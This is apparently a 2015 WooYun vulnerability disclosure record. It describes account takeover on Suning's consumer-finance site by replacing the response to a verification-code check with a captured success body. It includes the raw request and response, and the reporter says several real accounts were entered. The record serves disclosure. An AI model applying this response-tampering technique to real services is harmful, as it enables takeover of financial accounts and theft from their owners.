{"id": 48226, "wybug_id": "wooyun-2015-0127260", "wybug_title": "苏宁易购某站任意用户密码重置及帐户劫持(影响你的RMB)", "wybug_corp": "江苏苏宁易购电子商务有限公司", "wybug_author": "路人甲", "wybug_date": "2015-07-17 21:29", "wybug_open_date": "2015-09-03 09:06", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏校验", "支付行业敏感"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向公众公开  简要描述： dt in the house 详细说明：  \n苏宁消费金融有限公司是经中国银行业监督管理委员会批准成立的，由苏宁云商集团股份有限公司、南京银行股份有限公司、法国巴黎银行个人金融集团 (BNP Paribas Personal Finance)、江苏洋河酒厂股份有限公司和先声再康江苏药业有限公司五家企业共同出资申请设立的非银行金融机构。公司注册资本3亿元，总部设在南京，是江苏省首家专业专注于消费金融领域的金融机构，也是全国第一家民营为主的混合所有制消费金融公司。苏宁消费金融致力于打造国内一流的消费金融品牌。依托苏宁云商强大的渠道客户资源、南京银行丰富的金融行业经验以及法国巴黎银行全球领先的风险控制技术，苏宁消费金融将以更具突破性的创新思维和科学态度，努力打造互联互通的O2O消费金融新模式。面对国内经济发展的新常态，苏宁消费金融将全力推动普惠金融发展，助力消费结构升级，为普通消费者提供更加快捷、便利、实惠的消费金融服务。\napp 名称:任性付 IOS 站点名称:https://www.sncfc.com.cn/  苏宁消费金融 所有的数据都是经过加密的!!!密码重置,有个关键的校验验证码的请求\nPOST https://www.sncfc.com.cn/sncfc/VerifyCodeCheckPublic.do HTTP/1.1Host: www.sncfc.com.cndata=gxSRgsPJIKWyloJdnyiN%2BtkHsuhojQL%2BnWZGlOcWIJ4YXZAjD2MAKwALOz77x4H00elsRUqRnF%2B0zyW%2FewOmX2SrCNg3CBEtWVbKJaXLo3SKRY2d4nMEwv2LYbQPoYrjvG%2B9B6EnXhDCYzcjdcTveHXy%2BUVZ7OsmH0LhwfOu4dM%3D\n他的响应是这样的\nHTTP/1.1 200 OKServer: NRPdDate: Thu, 16 Jul 2015 13:29:04 GMTContent-Type: application/json;charset=UTF-8Connection: keep-aliveCache-Control: no-cachePragma: No-cacheExpires: Wed, 31 Dec 1969 23:59:59 GMTContent-Language: zh-CNX-Powered-By: Servlet/2.5 JSP/2.1Content-Length: 56psar43WxMrsXksqDAZnJrcm5QDzFifxJqJlS8rxPYvAq13MdLnMX2w==\nok 只要将其他用户帐户重置密码校验验证码时返回的数据包改成 \nContent-Length: 56psar43WxMrsXksqDAZnJrcm5QDzFifxJqJlS8rxPYvAq13MdLnMX2w==\n这样就ok   漏洞证明：  过程\n\n\n\n重置了两个帐户 \n\n\n\n另外可以劫持帐户,更换绑带的手机号码,验证码校验过程和上面的一样\n\n---------------------其实是有绑定银行卡,可以直接在suning.com 上直接消费的， 进了几个帐户，就不在此深入测试！   修复方案：  加密 有啥用阿！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-07-20 09:04 厂商回复： 感谢提交，目测问题存在，正在紧急修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-17 22:41 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  要送购物卡？    \n     2015-07-26 10:44 |    \t\tFnut \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:9        | 大王叫我来巡山，巡完南山巡北山)\t\t \n  好像最近都不怎么送了。。。@wefgod    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}